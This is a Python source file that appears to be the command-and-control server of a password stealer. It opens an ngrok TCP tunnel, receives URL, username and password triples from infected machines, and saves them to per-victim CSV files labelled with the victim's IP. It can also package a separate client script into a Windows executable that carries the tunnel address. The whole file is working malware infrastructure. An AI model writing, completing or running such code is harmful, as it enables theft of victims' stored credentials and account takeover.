import socket, csv, os
from pyngrok import conf, ngrok

def NgrokServer():
    with open("auth_token.txt", mode="r") as file:
        conf.get_default().auth_token = file.readline()
    try:      
        ngrok_tunnel = ngrok.connect(8796, "tcp")
        ip = ngrok_tunnel.public_url
    except e:
        print(e)
        print("Sometimes this happens when you run a program in a virtual machine so run the program on a real machine")

    with open("ip.txt", mode="w") as file:
        file.write(ip)

def Server():
    host = '127.0.0.1' 
    port = 8796

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"The server is listening on the port: {port}...")

        while True:
            conn, addr = s.accept()
            print(f"Connection established with {addr}")

            info = conn.recv(512).decode()
            headers, publicIP, pcName = info.split(',')
            print("Headers:", headers)
            conn.send("OK!".encode())
            with open(f"{pcName}.csv", mode='w', newline='') as file_csv:
                writer = csv.DictWriter(file_csv, fieldnames=['url', 'username', 'password', "victim's ip"])
                writer.writeheader()
                for i in range(int(headers)):
                    print(i)
                    data = conn.recv(2048).decode()
                    print(data)
                    url, username, password = data.split(' ')
                    conn.send("OK!".encode())
                    writer.writerow({'url': url, 'username': username, 'password': password, "victim's ip": publicIP})

            conn.close()
            break


if __name__ == "__main__":
    if not os.path.exists("auth_token.txt"):
        with open("auth_token.txt", mode="w") as file:
            file.write(input("Please enter your ngrok auth token: "))
        print("OK!")

    print("|-----------------------------------------------------------------------------------------|")
    print("|                                        Choose option!                                   |")
    print("| 0-Just start server | 1-Create exe file and start server (Only pick on windows machine) |")
    print("|-----------------------------------------------------------------------------------------|")
    while True:
        try:
            zm = int(input())
            if zm == 1 or zm == 0:
                break
            else:
                print("Only 0 or 1")

        except ValueError as e:
            print("Only numbers")
            print(e)

    if zm == 0:
        NgrokServer()
        Server()
    if zm == 1:
        NgrokServer()
        os.system("pyinstaller --noconfirm --onefile --console --name Yo --add-data ip.txt;. client.py")
        print("---------------------------------------", end="\nCheck 'dist' dir for exe file\n")
        Server()


